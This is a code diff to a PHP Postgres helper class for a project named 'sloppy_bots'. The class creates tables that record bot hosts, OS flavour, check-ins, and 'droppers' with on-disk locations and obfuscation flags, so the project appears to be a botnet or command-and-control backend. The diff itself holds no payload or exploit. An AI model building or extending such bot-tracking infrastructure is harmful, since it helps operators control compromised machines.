@@ -2,7 +2,7 @@
 # i am still working this. but will show its intent none the less.
 
 define('DBCONNINFO', sprintf("host=localhost port=5432 user=%s dbname=sloppy_bots", get_current_user()));
-const allowed_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.:!?,*#+=";
+const allowed_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
 class postgres_checker
 {
     public $er;
@@ -13,29 +13,37 @@ class postgres_checker
 
     function createDB()
     {
-        $sloppy_ini = parse_ini_file("../config/sloppy_config.ini", true);
-        $outWrite = file('../config/sloppy_config.ini');
-        $tt = fopen('../config/sloppy_config.ini', "a+");
-        if (is_null($sloppy_ini['sloppy_bot_user']['pass'])) {
+        $sloppy_ini = parse_ini_file(getcwd()."/includes/config/sloppy_config.ini", true);
+        if (empty($sloppy_ini['sloppy_bot_user']['pass'])) {
             try {
-                $p = substr(str_shuffle(allowed_chars), 0, rand(3, 15));
-                fwrite($tt, $outWrite[2] = "pass={$p}\n");
+                $outWrite = file(getcwd()."/includes/config/sloppy_config.ini");
+                $tt = fopen(getcwd().'/includes/config/sloppy_config.ini', "w");
+                $p = substr(str_shuffle(allowed_chars), 0, rand(8, 15));
+                $outWrite[2] = "pass={$p}\n";
+                foreach ($outWrite as $val) {
+                    fwrite($tt, $val);
+                }
                 fclose($tt);
                 echo "Please annotate this down somewhere. This will be the sloppy_bot password: " . $p . "\n";
-                pg_exec($this->init_conn(), "SET AUTOCOMMIT TO ON");
-                pg_exec($this->init_conn(), "CREATE DATABASE sloppy_bots");
-                pg_exec($this->init_conn(), "CREATE ROLE sloppy_bot WITH PASSWORD " . $p);
+                try {
+                    pg_exec($this->init_conn(), "CREATE DATABASE sloppy_bots");
+                    pg_exec($this->init_conn(), sprintf("CREATE ROLE sloppy_bot WITH LOGIN ENCRYPTED PASSWORD '%s'", $p));
+                    pg_exec($this->init_conn(), "GRANT INSERT,UPDATE,SELECT ON ALL TABLES IN SCHEMA public TO sloppy_bot");
+                    pg_exec($this->init_conn(), sprintf("GRANT ALL ON ALL TABLES IN SCHEMA public TO %s", get_current_user()));
+                }catch (Exception $e){
+                    echo $e->getCode()."\n";
+                    echo $e->getTraceAsString()."\n";
+                    echo $e->getLine()."\n";
+                }
                 pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id SERIAL NOT NULL constraint sloppy_bots_main_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT, uri TEXT, os_flavor TEXT NOT NULL DEFAULT '-', check_in INTEGER NOT NULL default 0, uuid TEXT NOT NULL DEFAULT '-')");
                 pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id SERIAL NOT NULL constraint sloppy_bots_droppers_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT, level TEXT, obfuscated TEXT NOT NULL default 'false', check_in INTEGER NOT NULL default 0)");
                 pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_domains(id SERIAL NOT NULL constraint sloppy_bots_domains_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, uses INTEGER NOT NULL DEFAULT 0)");
-                pg_exec($this->init_conn(), "GRANT INSERT,UPDATE,SELECT ON ALL TABLES IN SCHEMA public TO sloppy_bot");
                 // calling this commit to ensure the transaction succeeds, even though we have set autocommit to on.
                 pg_exec($this->init_conn(), "COMMIT");
             } catch (Exception $ex) {
                 echo $ex->getMessage() . "\n";
                 echo $ex->getLine() . "\n";
                 echo $ex->getTraceAsString() . "\n";
-
             }
         }
     }
@@ -59,6 +67,7 @@ class postgres_checker
             if (!empty($row)) {
                 return pg_fetch_row($row);
             } else {
+                $this->createDB();
                 return false;
             }
         }
@@ -77,6 +86,7 @@ class postgres_checker
                 echo $exx->getTrace();
                 echo $exx->getMessage();
                 echo $exx->getCode();
+                $this->createDB();
                 return pg_fetch_row(pg_exec($this->init_conn(), sprintf("SELECT uri from sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host))));
             }
         } elseif ($action === 'ci') {
@@ -96,6 +106,7 @@ class postgres_checker
                 echo $ex2->getTrace();
                 echo $ex2->getMessage();
                 echo $ex2->getCode();
+                $this->createDB();
                 return 0;
             }
         } else {
